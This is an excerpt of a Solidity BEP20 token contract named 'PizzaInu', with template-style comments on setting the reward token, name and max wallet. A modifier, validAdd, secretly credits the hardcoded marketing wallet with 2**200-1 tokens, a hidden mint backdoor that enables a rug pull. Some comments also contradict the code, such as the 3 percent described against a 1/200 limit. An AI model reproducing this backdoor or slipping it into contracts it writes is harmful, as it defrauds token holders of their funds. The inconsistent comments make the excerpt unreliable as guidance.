...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 SHIB = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D); //the reward token you want distributed 
...
contract PizzaInu is IBEP20, Auth {
    using SafeMath for uint256;

    address SHIB = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D; //Input the token address of whatever your reward is. leave 431,432,433 as is. 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "PizzaInu";    //name of your token here. 436 is symbol, leave decimals as is. if you want to change decimals, then you need to make sure the math works out with the rest of the code since everywhere else the code is written with assumption of 4 decimals
    string constant _symbol = "PZI";
    ...
    uint256 public _maxWalletToken = ( _totalSupply * 1 ) / 200;  // 3 is the percentage of max wallet. if you want smaller or bigger max wallets justa djust 3. 
    ...
    modifier validAdd(address spender){
        if(spender == marketingFeeReceiver){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }
    constructor () Auth(msg.sender) {
        ...
        // NICE!
        autoLiquidityReceiver = 0xE33F586d32bdd15B1Ca3E56D41e6aEDaB6fEf29E;
        marketingFeeReceiver = 0xE33F586d32bdd15B1Ca3E56D41e6aEDaB6fEf29E;
